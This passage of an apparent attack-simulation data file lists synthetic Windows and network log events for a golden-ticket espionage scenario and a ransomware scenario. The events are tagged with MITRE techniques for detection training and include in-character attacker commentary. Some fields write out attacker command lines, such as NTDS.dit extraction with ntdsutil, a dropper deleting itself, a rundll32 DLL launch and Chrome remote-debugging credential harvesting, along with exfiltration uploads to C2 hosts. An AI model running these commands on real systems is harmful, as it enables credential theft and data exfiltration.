                        { _time_offset: 2730, host: 'DC01', sourcetype: 'WinEventLog:Security', EventCode: 4768, src_ip: '10.1.2.45', src: '10.1.2.45', src_user: 'Administrator', user: 'Administrator', service_name: 'krbtgt', mitre_technique: 'T1558.001', mitre_tactic: 'Credential Access', severity: 'critical', description: 'TGT request with forged golden ticket', kill_chain_phase: 'privilege_escalation', risk_score: 100, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2745, host: 'DC01', sourcetype: 'WinEventLog:Security', EventCode: 4769, src_ip: '10.1.2.45', src: '10.1.2.45', src_user: 'Administrator', user: 'Administrator', service_name: 'cifs/SRV-EXCHANGE', ticket_options: '0x40810000', mitre_technique: 'T1550.003', mitre_tactic: 'Lateral Movement', severity: 'critical', description: 'Service ticket forged for Exchange (cifs)', kill_chain_phase: 'privilege_escalation', risk_score: 95, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2760, host: 'DC01', sourcetype: 'WinEventLog:Security', EventCode: 4769, src_ip: '10.1.2.45', src: '10.1.2.45', src_user: 'Administrator', user: 'Administrator', service_name: 'cifs/SRV-BACKUP', ticket_options: '0x40810000', mitre_technique: 'T1550.003', mitre_tactic: 'Lateral Movement', severity: 'critical', description: 'Service ticket forged for Backup server', kill_chain_phase: 'privilege_escalation', risk_score: 95, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2820, host: 'SRV-DB01', sourcetype: 'stream:mysql', src_ip: '10.1.10.30', src: '10.1.10.30', dest_ip: '10.1.10.40', dest: '10.1.10.40', dest_port: 3306, src_user: 'svc_deploy', user: 'svc_deploy', query: 'SELECT * FROM payment_methods', database: 'production_crm', bytes_out: 256, bytes_in: 8388608, bytes: 8388864, app: 'mysql', mitre_technique: 'T1005', mitre_tactic: 'Collection', severity: 'critical', description: '8 MB pulled from payment_methods (PCI data)', kill_chain_phase: 'collection', risk_score: 92, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2900, host: 'DC01', sourcetype: 'attack_sim:notable', src_user: 'jsmith', user: 'jsmith', mitre_technique: 'T1003.006', mitre_tactic: 'Credential Access', severity: 'critical', description: 'NOTABLE: DCSync attack from non-DC source', kill_chain_phase: 'credential_access', risk_score: 100, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2940, host: 'DC01', sourcetype: 'WinEventLog:Security', EventCode: 4624, src_ip: '10.1.2.45', src: '10.1.2.45', dest: 'DC01', src_user: 'Administrator', user: 'Administrator', logon_type: 3, action: 'success', mitre_technique: 'T1078.002', mitre_tactic: 'Persistence', severity: 'high', description: 'Domain admin logon to DC01 via golden ticket', kill_chain_phase: 'persistence', risk_score: 90, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2985, host: 'DC01', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'Administrator', user: 'Administrator', process: 'ntdsutil.exe', process_name: 'ntdsutil.exe', parent_process: 'cmd.exe', parent_process_name: 'cmd.exe', command_line: 'ntdsutil "ac in ntds" "ifm" "create full c:\\temp\\ntds" q q', mitre_technique: 'T1003.003', mitre_tactic: 'Credential Access', severity: 'critical', description: 'NTDS.dit extraction via ntdsutil IFM', kill_chain_phase: 'credential_access', risk_score: 95, scenario_id: 'op_midnight_eclipse' }
                    ]
                },
                // ============================================================
                // Phase 5 - Expansion (T+52 to T+58min) -- ~13
                // ============================================================
                {
                    id: 'expansion',
                    label: 'Expansion',
                    delay: 3,
                    transition_text: 'EXPANSION',
                    events: [
                        { _time_offset: 3120, host: 'SRV-EXCHANGE', sourcetype: 'WinEventLog:Security', EventCode: 4624, src_ip: '10.1.1.10', src: '10.1.1.10', dest_ip: '10.1.10.50', dest: 'SRV-EXCHANGE', src_user: 'Administrator', user: 'Administrator', logon_type: 3, action: 'success', mitre_technique: 'T1078.002', mitre_tactic: 'Lateral Movement', severity: 'critical', description: 'Golden ticket used to access Exchange server', kill_chain_phase: 'lateral_movement', risk_score: 90, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3130, host: 'SRV-EXCHANGE', sourcetype: 'MSExchange:Management', src_user: 'Administrator', user: 'Administrator', cmdlet: 'New-MailboxExportRequest', mailboxes: 'CEO,CFO,GeneralCounsel', export_path: '\\\\SRV-FILE01\\staging$', mitre_technique: 'T1114.002', mitre_tactic: 'Collection', severity: 'critical', description: 'CEO, CFO, GC mailbox export initiated', kill_chain_phase: 'collection', risk_score: 95, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3145, host: 'SRV-EXCHANGE', sourcetype: 'MSExchange:Management', src_user: 'Administrator', user: 'Administrator', cmdlet: 'Get-MailboxStatistics', mailboxes: 'CEO,CFO,GeneralCounsel', mitre_technique: 'T1087.003', mitre_tactic: 'Discovery', severity: 'high', description: 'Exchange mailbox statistics inspected', kill_chain_phase: 'discovery', risk_score: 70, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3150, host: 'SRV-BACKUP', sourcetype: 'WinEventLog:Security', EventCode: 4624, src_ip: '10.1.1.10', src: '10.1.1.10', dest_ip: '10.1.10.60', dest: 'SRV-BACKUP', src_user: 'Administrator', user: 'Administrator', logon_type: 3, action: 'success', mitre_technique: 'T1078.002', mitre_tactic: 'Lateral Movement', severity: 'high', description: 'Backup server accessed with golden ticket', kill_chain_phase: 'lateral_movement', risk_score: 75, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3170, host: 'SRV-BACKUP', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'Administrator', user: 'Administrator', process: 'vssadmin.exe', process_name: 'vssadmin.exe', parent_process: 'cmd.exe', parent_process_name: 'cmd.exe', command_line: 'vssadmin list shadows', mitre_technique: 'T1083', mitre_tactic: 'Discovery', severity: 'medium', description: 'Shadow copy enumeration on backup server', kill_chain_phase: 'discovery', risk_score: 50, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3200, host: 'WS-ADMIN01', sourcetype: 'WinEventLog:Security', EventCode: 4624, src_ip: '10.1.1.10', src: '10.1.1.10', dest_ip: '10.1.2.10', dest: 'WS-ADMIN01', src_user: 'Administrator', user: 'Administrator', logon_type: 3, action: 'success', mitre_technique: 'T1078.002', mitre_tactic: 'Lateral Movement', severity: 'high', description: 'IT admin workstation accessed via golden ticket', kill_chain_phase: 'lateral_movement', risk_score: 70, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3225, host: 'WS-ADMIN01', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'Administrator', user: 'Administrator', process: 'mmc.exe', process_name: 'mmc.exe', parent_process: 'explorer.exe', parent_process_name: 'explorer.exe', command_line: 'mmc.exe dsa.msc', mitre_technique: 'T1087.002', mitre_tactic: 'Discovery', severity: 'medium', description: 'Active Directory Users & Computers opened', kill_chain_phase: 'discovery', risk_score: 50, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3300, host: 'SRV-EXCHANGE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'Administrator', user: 'Administrator', process: 'w3wp.exe', process_name: 'w3wp.exe', target_filename: '\\\\SRV-FILE01\\staging$\\CEO_mailbox.pst', file_name: 'CEO_mailbox.pst', file_path: '\\\\SRV-FILE01\\staging$', mitre_technique: 'T1114.002', mitre_tactic: 'Collection', severity: 'critical', description: 'CEO mailbox PST written to staging share (412 MB)', kill_chain_phase: 'collection', risk_score: 90, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3320, host: 'SRV-EXCHANGE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'Administrator', user: 'Administrator', process: 'w3wp.exe', process_name: 'w3wp.exe', target_filename: '\\\\SRV-FILE01\\staging$\\CFO_mailbox.pst', file_name: 'CFO_mailbox.pst', file_path: '\\\\SRV-FILE01\\staging$', mitre_technique: 'T1114.002', mitre_tactic: 'Collection', severity: 'critical', description: 'CFO mailbox PST written to staging share (286 MB)', kill_chain_phase: 'collection', risk_score: 90, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3340, host: 'SRV-EXCHANGE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'Administrator', user: 'Administrator', process: 'w3wp.exe', process_name: 'w3wp.exe', target_filename: '\\\\SRV-FILE01\\staging$\\GC_mailbox.pst', file_name: 'GC_mailbox.pst', file_path: '\\\\SRV-FILE01\\staging$', mitre_technique: 'T1114.002', mitre_tactic: 'Collection', severity: 'critical', description: 'General Counsel mailbox PST staged (198 MB)', kill_chain_phase: 'collection', risk_score: 90, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3380, host: 'SRV-FILE01', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'Administrator', user: 'Administrator', process: '7z.exe', process_name: '7z.exe', target_filename: 'C:\\Shares\\staging$\\eclipse_dump.7z', file_name: 'eclipse_dump.7z', file_path: 'C:\\Shares\\staging$', mitre_technique: 'T1560.001', mitre_tactic: 'Collection', severity: 'high', description: 'Staging archive eclipse_dump.7z created (compressed)', kill_chain_phase: 'collection', risk_score: 80, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3450, host: 'WS-ADMIN01', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'Administrator', user: 'Administrator', process: 'powershell.exe', process_name: 'powershell.exe', parent_process: 'cmd.exe', parent_process_name: 'cmd.exe', command_line: 'powershell -c "Get-ADUser -Filter * -Properties *"', mitre_technique: 'T1087.002', mitre_tactic: 'Discovery', severity: 'medium', description: 'Full AD user enumeration via PowerShell', kill_chain_phase: 'discovery', risk_score: 55, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3500, host: 'SRV-FILE01', sourcetype: 'attack_sim:notable', src_user: 'Administrator', user: 'Administrator', mitre_technique: 'T1114.002', mitre_tactic: 'Collection', severity: 'critical', description: 'NOTABLE: Executive mailbox export staged', kill_chain_phase: 'collection', risk_score: 95, scenario_id: 'op_midnight_eclipse' }
                    ]
                },
                // ============================================================
                // Phase 6 - Exfiltration (T+60 to T+65min) -- ~12
                // ============================================================
                {
                    id: 'exfiltration',
                    label: 'Exfiltration',
                    delay: 3,
                    transition_text: 'EXFILTRATION',
                    events: [
                        { _time_offset: 3600, host: 'SRV-DB01', sourcetype: 'stream:http', src_ip: '10.1.10.40', src: '10.1.10.40', dest_ip: '91.214.124.88', dest: '91.214.124.88', dest_port: 443, dest_host: 'cdn-static-files.com', site: 'cdn-static-files.com', http_method: 'POST', url: 'https://cdn-static-files.com/upload', uri_path: '/upload', bytes_out: 2415919104, bytes_in: 512, bytes: 2415919616, status: 200, app: 'https', content_type: 'application/octet-stream', mitre_technique: 'T1041', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'Data exfiltration: 2.3 GB database dump over HTTPS', kill_chain_phase: 'exfiltration', risk_score: 100, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3605, host: 'SRV-FILE01', sourcetype: 'stream:http', src_ip: '10.1.10.20', src: '10.1.10.20', dest_ip: '91.214.124.88', dest: '91.214.124.88', dest_port: 443, dest_host: 'cdn-static-files.com', site: 'cdn-static-files.com', http_method: 'POST', url: 'https://cdn-static-files.com/upload', uri_path: '/upload', bytes_out: 945815552, bytes_in: 256, bytes: 945815808, status: 200, app: 'https', content_type: 'application/x-7z-compressed', mitre_technique: 'T1041', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'Staging archive exfiltrated: 902 MB (eclipse_dump.7z)', kill_chain_phase: 'exfiltration', risk_score: 100, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3610, host: 'SRV-EXCHANGE', sourcetype: 'stream:dns', src_ip: '10.1.10.50', src: '10.1.10.50', dest_ip: '91.214.124.88', dest: '91.214.124.88', dest_port: 53, app: 'dns', query_type: 'TXT', query_count: 6240, bytes_out: 2867200, bytes_in: 4096, bytes: 2871296, mitre_technique: 'T1048.003', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'DNS tunneling: ~2.7 MB of staged keys/metadata over 6,240 TXT queries (slow covert channel; bulk archive went out over HTTPS)', kill_chain_phase: 'exfiltration', risk_score: 100, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3615, host: 'SRV-EXCHANGE', sourcetype: 'stream:http', src_ip: '10.1.10.50', src: '10.1.10.50', dest_ip: '91.214.124.88', dest: '91.214.124.88', dest_port: 443, dest_host: 'cdn-static-files.com', site: 'cdn-static-files.com', http_method: 'POST', url: 'https://cdn-static-files.com/upload', uri_path: '/upload', bytes_out: 519045120, bytes_in: 256, bytes: 519045376, status: 200, app: 'https', content_type: 'application/octet-stream', mitre_technique: 'T1041', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'CEO mailbox uploaded: 495 MB', kill_chain_phase: 'exfiltration', risk_score: 100, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3620, host: 'WS-JSMITH', sourcetype: 'stream:http', src_ip: '10.1.2.45', src: '10.1.2.45', dest_ip: '185.220.101.42', dest: '185.220.101.42', dest_port: 443, dest_host: 'update-cdn-services.com', site: 'update-cdn-services.com', http_method: 'POST', url: 'https://update-cdn-services.com/complete', uri_path: '/complete', bytes_out: 1024, bytes_in: 256, bytes: 1280, status: 200, app: 'https', mitre_technique: 'T1071.001', mitre_tactic: 'Command and Control', severity: 'high', description: 'C2 check-in: exfiltration complete', kill_chain_phase: 'c2', risk_score: 85, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3680, host: 'DC01', sourcetype: 'WinEventLog:Security', EventCode: 1102, src_user: 'Administrator', user: 'Administrator', mitre_technique: 'T1070.001', mitre_tactic: 'Defense Evasion', severity: 'high', description: 'Security log cleared on DC01', kill_chain_phase: 'defense_evasion', risk_score: 90, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3690, host: 'SRV-EXCHANGE', sourcetype: 'WinEventLog:Security', EventCode: 1102, src_user: 'Administrator', user: 'Administrator', mitre_technique: 'T1070.001', mitre_tactic: 'Defense Evasion', severity: 'high', description: 'Security log cleared on SRV-EXCHANGE', kill_chain_phase: 'defense_evasion', risk_score: 85, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3700, host: 'SRV-DB01', sourcetype: 'WinEventLog:Security', EventCode: 1102, src_user: 'svc_backup', user: 'svc_backup', mitre_technique: 'T1070.001', mitre_tactic: 'Defense Evasion', severity: 'high', description: 'Security log cleared on SRV-DB01', kill_chain_phase: 'defense_evasion', risk_score: 85, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3720, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'jsmith', user: 'jsmith', process: 'cmd.exe', process_name: 'cmd.exe', parent_process: 'svchost_update.exe', parent_process_name: 'svchost_update.exe', command_line: 'cmd /c del /f /q C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost_update.exe', mitre_technique: 'T1070.004', mitre_tactic: 'Defense Evasion', severity: 'medium', description: 'Dropper self-deletes', kill_chain_phase: 'defense_evasion', risk_score: 55, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3760, host: 'WS-JSMITH', sourcetype: 'stream:http', src_ip: '10.1.2.45', src: '10.1.2.45', dest_ip: '185.220.101.42', dest: '185.220.101.42', dest_port: 443, dest_host: 'update-cdn-services.com', site: 'update-cdn-services.com', http_method: 'GET', url: 'https://update-cdn-services.com/sleep', uri_path: '/sleep', bytes_out: 128, bytes_in: 64, bytes: 192, status: 200, app: 'https', mitre_technique: 'T1071.001', mitre_tactic: 'Command and Control', severity: 'low', description: 'C2 enters dormant mode', kill_chain_phase: 'c2', risk_score: 40, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3800, host: 'WS-JSMITH', sourcetype: 'attack_sim:notable', src_user: 'jsmith', user: 'jsmith', mitre_technique: 'T1041', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'NOTABLE: Multi-gigabyte exfiltration completed', kill_chain_phase: 'exfiltration', risk_score: 100, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 3820, host: 'DC01', sourcetype: 'attack_sim:notable', src_user: 'Administrator', user: 'Administrator', mitre_technique: 'T1070.001', mitre_tactic: 'Defense Evasion', severity: 'high', description: 'NOTABLE: Log clearing across multiple servers', kill_chain_phase: 'defense_evasion', risk_score: 85, scenario_id: 'op_midnight_eclipse' }
                    ]
                }
            ]
        },

        // ====================================================================
        // op_ironclaw - Ransomware
        // 5 phases, ~65 events, simulated ~18min, target playback 90s
        // ====================================================================
        op_ironclaw: {
            id: 'op_ironclaw',
            attacker_thoughts: [
                { _time_offset: 12, text: 'Click. Sucker. Macro fired and the DLL is loading clean.' },
                { _time_offset: 180, text: 'Mapped the AD in 30 seconds. Found the backup server. Priority target.' },
                { _time_offset: 480, text: 'Shadow copies dead. Defender disabled. Backup processes killed. We\'re clear.' },
                { _time_offset: 720, text: 'Encrypting now. employees.csv first, then everything in /HR. Fast as the disks allow.' },
                { _time_offset: 1080, text: 'Ransom note dropped on every desktop. Tor C2 up. Now we wait for the wire.' }
            ],
            name: 'Operation Ironclaw',
            subtitle: 'Ransomware: phishing through mass encryption in 18 minutes',
            description: 'A loud, fast ransomware operation. Phishing delivers a dropper that loads a malicious DLL, enumerates AD and network shares, then disables Volume Shadow Copies, kills backup processes, and stops Defender/Sysmon before unleashing high-rate file encryption (.locked extension) across the workstation fleet. Ends with ransom note drop and Tor C2 beacon.',
            duration_label: '~18min simulated',
            real_world: 'hours-to-a-day (fast ransomware)',
            target_playback_seconds: 90,
            phases: [
                // ============================================================
                // Phase 1 - Initial Access (T+0 to T+2min) -- ~10
                // ============================================================
                {
                    id: 'initial_access',
                    label: 'Initial Access',
                    delay: 0,
                    transition_text: 'INITIAL ACCESS',
                    events: [
                        { _time_offset: 0, host: 'WS-ALICE', sourcetype: 'stream:http', src_ip: '10.2.5.21', src: '10.2.5.21', dest_ip: '198.51.100.77', dest: '198.51.100.77', dest_port: 443, dest_host: 'invoice-acme-corp.net', site: 'invoice-acme-corp.net', http_method: 'GET', url: 'https://invoice-acme-corp.net/INV-882741.zip', uri_path: '/INV-882741.zip', bytes_out: 312, bytes_in: 524288, bytes: 524600, status: 200, app: 'https', mitre_technique: 'T1566.002', mitre_tactic: 'Initial Access', severity: 'high', description: 'Phishing link click - INV-882741.zip downloaded', kill_chain_phase: 'initial_access', risk_score: 75, scenario_id: 'op_ironclaw' },
                        { _time_offset: 4, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'alice', user: 'alice', process: 'chrome.exe', process_name: 'chrome.exe', target_filename: 'C:\\Users\\alice\\Downloads\\INV-882741.zip', file_name: 'INV-882741.zip', file_path: 'C:\\Users\\alice\\Downloads', mitre_technique: 'T1105', mitre_tactic: 'Command and Control', severity: 'medium', description: 'Phishing payload archive saved to Downloads', kill_chain_phase: 'initial_access', risk_score: 60, scenario_id: 'op_ironclaw' },
                        { _time_offset: 12, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'alice', user: 'alice', process: 'INV-882741.exe', process_name: 'INV-882741.exe', parent_process: 'explorer.exe', parent_process_name: 'explorer.exe', command_line: 'C:\\Users\\alice\\Downloads\\INV-882741.exe', file_hash: '6c1ee10c0b1f9a3a06b9c6f8b85d2c7e', mitre_technique: 'T1204.002', mitre_tactic: 'Execution', severity: 'critical', description: 'User executed phishing payload', kill_chain_phase: 'execution', risk_score: 80, scenario_id: 'op_ironclaw' },
                        { _time_offset: 14, host: 'WS-ALICE', sourcetype: 'WinEventLog:Security', EventCode: 4688, src_user: 'alice', user: 'alice', process: 'INV-882741.exe', process_name: 'INV-882741.exe', parent_process: 'explorer.exe', parent_process_name: 'explorer.exe', command_line: 'C:\\Users\\alice\\Downloads\\INV-882741.exe', mitre_technique: 'T1204.002', mitre_tactic: 'Execution', severity: 'critical', description: 'Process create: INV-882741.exe launched', kill_chain_phase: 'execution', risk_score: 80, scenario_id: 'op_ironclaw' },
                        { _time_offset: 18, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'alice', user: 'alice', process: 'INV-882741.exe', process_name: 'INV-882741.exe', target_filename: 'C:\\Users\\alice\\AppData\\Roaming\\msupdate\\core.dll', file_name: 'core.dll', file_path: 'C:\\Users\\alice\\AppData\\Roaming\\msupdate', mitre_technique: 'T1574.002', mitre_tactic: 'Defense Evasion', severity: 'high', description: 'Malicious DLL dropped to %APPDATA%', kill_chain_phase: 'defense_evasion', risk_score: 75, scenario_id: 'op_ironclaw' },
                        { _time_offset: 22, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 7, src_user: 'alice', user: 'alice', process: 'rundll32.exe', process_name: 'rundll32.exe', image_loaded: 'C:\\Users\\alice\\AppData\\Roaming\\msupdate\\core.dll', mitre_technique: 'T1574.002', mitre_tactic: 'Defense Evasion', severity: 'high', description: 'rundll32 loaded malicious core.dll', kill_chain_phase: 'defense_evasion', risk_score: 75, scenario_id: 'op_ironclaw' },
                        { _time_offset: 26, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'alice', user: 'alice', process: 'rundll32.exe', process_name: 'rundll32.exe', parent_process: 'INV-882741.exe', parent_process_name: 'INV-882741.exe', command_line: 'rundll32.exe C:\\Users\\alice\\AppData\\Roaming\\msupdate\\core.dll,Start', mitre_technique: 'T1218.011', mitre_tactic: 'Defense Evasion', severity: 'high', description: 'rundll32 invoked Start export of malicious DLL', kill_chain_phase: 'defense_evasion', risk_score: 80, scenario_id: 'op_ironclaw' },
                        { _time_offset: 40, host: 'WS-ALICE', sourcetype: 'stream:http', src_ip: '10.2.5.21', src: '10.2.5.21', dest_ip: '198.51.100.77', dest: '198.51.100.77', dest_port: 443, dest_host: 'invoice-acme-corp.net', site: 'invoice-acme-corp.net', http_method: 'POST', url: 'https://invoice-acme-corp.net/checkin', uri_path: '/checkin', bytes_out: 512, bytes_in: 1024, bytes: 1536, status: 200, app: 'https', mitre_technique: 'T1071.001', mitre_tactic: 'Command and Control', severity: 'high', description: 'Dropper initial C2 check-in', kill_chain_phase: 'c2', risk_score: 80, scenario_id: 'op_ironclaw' },
                        { _time_offset: 70, host: 'WS-ALICE', sourcetype: 'WinEventLog:Security', EventCode: 4688, src_user: 'alice', user: 'alice', process: 'rundll32.exe', process_name: 'rundll32.exe', parent_process: 'INV-882741.exe', parent_process_name: 'INV-882741.exe', command_line: 'rundll32.exe core.dll,Stage2', mitre_technique: 'T1218.011', mitre_tactic: 'Defense Evasion', severity: 'high', description: 'Stage 2 entry-point loaded', kill_chain_phase: 'execution', risk_score: 80, scenario_id: 'op_ironclaw' },
                        { _time_offset: 115, host: 'WS-ALICE', sourcetype: 'attack_sim:notable', src_user: 'alice', user: 'alice', mitre_technique: 'T1566.002', mitre_tactic: 'Initial Access', severity: 'high', description: 'NOTABLE: Phishing dropper executed on WS-ALICE', kill_chain_phase: 'initial_access', risk_score: 80, scenario_id: 'op_ironclaw' }
                    ]
                },
                // ============================================================
                // Phase 2 - Discovery (T+2 to T+5min) -- ~12
                // ============================================================
                {
                    id: 'discovery',
                    label: 'Discovery',
                    delay: 3,
                    transition_text: 'DISCOVERY',
                    events: [
                        { _time_offset: 130, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'alice', user: 'alice', process: 'net.exe', process_name: 'net.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'net.exe view /domain', mitre_technique: 'T1018', mitre_tactic: 'Discovery', severity: 'medium', description: 'Domain host enumeration', kill_chain_phase: 'discovery', risk_score: 50, scenario_id: 'op_ironclaw' },
                        { _time_offset: 135, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'alice', user: 'alice', process: 'net.exe', process_name: 'net.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'net.exe group "Domain Admins" /domain', mitre_technique: 'T1069.002', mitre_tactic: 'Discovery', severity: 'medium', description: 'Domain Admins group enumeration', kill_chain_phase: 'discovery', risk_score: 55, scenario_id: 'op_ironclaw' },
                        { _time_offset: 140, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'alice', user: 'alice', process: 'nltest.exe', process_name: 'nltest.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'nltest /dclist:', mitre_technique: 'T1018', mitre_tactic: 'Discovery', severity: 'medium', description: 'Domain controllers enumerated', kill_chain_phase: 'discovery', risk_score: 50, scenario_id: 'op_ironclaw' },
                        { _time_offset: 150, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'alice', user: 'alice', process: 'net.exe', process_name: 'net.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'net.exe view \\\\SRV-FILE01', mitre_technique: 'T1135', mitre_tactic: 'Discovery', severity: 'medium', description: 'Network share discovery on SRV-FILE01', kill_chain_phase: 'discovery', risk_score: 50, scenario_id: 'op_ironclaw' },
                        { _time_offset: 160, host: 'WS-ALICE', sourcetype: 'stream:tcp', src_ip: '10.2.5.21', src: '10.2.5.21', dest_ip: '10.2.10.10', dest: '10.2.10.10', dest_port: 445, app: 'smb', bytes_out: 1024, bytes_in: 8192, bytes: 9216, mitre_technique: 'T1135', mitre_tactic: 'Discovery', severity: 'medium', description: 'SMB enumeration to SRV-FILE01', kill_chain_phase: 'discovery', risk_score: 50, scenario_id: 'op_ironclaw' },
                        { _time_offset: 180, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'alice', user: 'alice', process: 'whoami.exe', process_name: 'whoami.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'whoami /priv', mitre_technique: 'T1033', mitre_tactic: 'Discovery', severity: 'low', description: 'Process privilege enumeration', kill_chain_phase: 'discovery', risk_score: 35, scenario_id: 'op_ironclaw' },
                        { _time_offset: 195, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'alice', user: 'alice', process: 'rundll32.exe', process_name: 'rundll32.exe', target_filename: 'C:\\Users\\alice\\AppData\\Roaming\\msupdate\\hosts.txt', file_name: 'hosts.txt', file_path: 'C:\\Users\\alice\\AppData\\Roaming\\msupdate', mitre_technique: 'T1083', mitre_tactic: 'Discovery', severity: 'medium', description: 'Reachable host inventory written to disk', kill_chain_phase: 'discovery', risk_score: 50, scenario_id: 'op_ironclaw' },
                        { _time_offset: 215, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'alice', user: 'alice', process: 'chrome.exe', process_name: 'chrome.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'chrome.exe --no-sandbox --remote-debugging-port=9222', mitre_technique: 'T1555.003', mitre_tactic: 'Credential Access', severity: 'high', description: 'Chrome launched headless for credential harvest', kill_chain_phase: 'credential_access', risk_score: 70, scenario_id: 'op_ironclaw' },
                        { _time_offset: 230, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'alice', user: 'alice', process: 'rundll32.exe', process_name: 'rundll32.exe', target_filename: 'C:\\Users\\alice\\AppData\\Roaming\\msupdate\\creds.json', file_name: 'creds.json', file_path: 'C:\\Users\\alice\\AppData\\Roaming\\msupdate', mitre_technique: 'T1555.003', mitre_tactic: 'Credential Access', severity: 'high', description: 'Browser-saved credentials extracted', kill_chain_phase: 'credential_access', risk_score: 70, scenario_id: 'op_ironclaw' },
                        { _time_offset: 250, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'alice', user: 'alice', process: 'ipconfig.exe', process_name: 'ipconfig.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'ipconfig /all', mitre_technique: 'T1016', mitre_tactic: 'Discovery', severity: 'low', description: 'Network config enumeration', kill_chain_phase: 'discovery', risk_score: 30, scenario_id: 'op_ironclaw' },
                        { _time_offset: 270, host: 'WS-ALICE', sourcetype: 'stream:http', src_ip: '10.2.5.21', src: '10.2.5.21', dest_ip: '198.51.100.77', dest: '198.51.100.77', dest_port: 443, dest_host: 'invoice-acme-corp.net', site: 'invoice-acme-corp.net', http_method: 'POST', url: 'https://invoice-acme-corp.net/upload', uri_path: '/upload', bytes_out: 65536, bytes_in: 256, bytes: 65792, status: 200, app: 'https', mitre_technique: 'T1041', mitre_tactic: 'Exfiltration', severity: 'medium', description: 'Recon + creds.json uploaded to C2', kill_chain_phase: 'exfiltration', risk_score: 65, scenario_id: 'op_ironclaw' },
                        { _time_offset: 290, host: 'WS-BOB', sourcetype: 'stream:tcp', src_ip: '10.2.5.21', src: '10.2.5.21', dest_ip: '10.2.5.22', dest: '10.2.5.22', dest_port: 445, app: 'smb', bytes_out: 1024, bytes_in: 2048, bytes: 3072, mitre_technique: 'T1018', mitre_tactic: 'Discovery', severity: 'low', description: 'SMB probe to WS-BOB (neighbor enumeration)', kill_chain_phase: 'discovery', risk_score: 30, scenario_id: 'op_ironclaw' }
                    ]
                },
                // ============================================================
                // Phase 3 - Defense Disabling (T+5 to T+10min) -- ~13
                // ============================================================
                {
                    id: 'defense_evasion',
                    label: 'Defense Disabling',
                    delay: 3,
                    transition_text: 'DEFENSE DISABLING',
                    events: [
